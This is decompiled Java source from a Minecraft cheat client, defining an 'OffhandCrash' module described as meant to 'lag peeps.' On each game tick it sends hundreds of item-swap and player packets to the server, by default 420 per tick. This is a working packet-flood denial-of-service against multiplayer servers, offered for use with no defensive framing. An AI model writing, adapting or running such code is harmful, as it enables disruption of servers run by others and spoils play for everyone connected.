/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.minecraft.network.Packet
 *  net.minecraft.network.play.client.CPacketPlayer
 *  net.minecraft.network.play.client.CPacketPlayerDigging
 *  net.minecraft.network.play.client.CPacketPlayerDigging$Action
 *  net.minecraft.util.EnumFacing
 *  net.minecraft.util.math.BlockPos
 */
package me.abHack.features.modules.misc;

import me.abHack.OyVey;
import me.abHack.features.modules.Module;
import me.abHack.features.setting.Setting;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.BlockPos;

public class OffhandCrash
extends Module {
    private final Setting<String> speed = this.register(new Setting<String>("Speed", "420"));
    private final Setting<Boolean> escoff = this.register(new Setting<Boolean>("EscOff", true));

    public OffhandCrash() {
        super("OffhandCrash", "lag peeps.", Module.Category.MISC, false, false, false);
    }

    @Override
    public void onLogout() {
        if (this.escoff.getValue().booleanValue() && OyVey.moduleManager.isModuleEnabled("OffhandCrash")) {
            this.disable();
        }
    }

    @Override
    public void onLogin() {
        if (this.escoff.getValue().booleanValue() && OyVey.moduleManager.isModuleEnabled("OffhandCrash")) {
            this.disable();
        }
    }

    @Override
    public void onTick() {
        if (OffhandCrash.mc.world == null || OffhandCrash.mc.player == null) {
            return;
        }
        for (int i = 0; i < Integer.valueOf(this.speed.getValue()); ++i) {
            OffhandCrash.mc.player.connection.sendPacket((Packet)new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, BlockPos.ORIGIN, EnumFacing.UP));
            OffhandCrash.mc.player.connection.sendPacket((Packet)new CPacketPlayer(true));
        }
    }
}

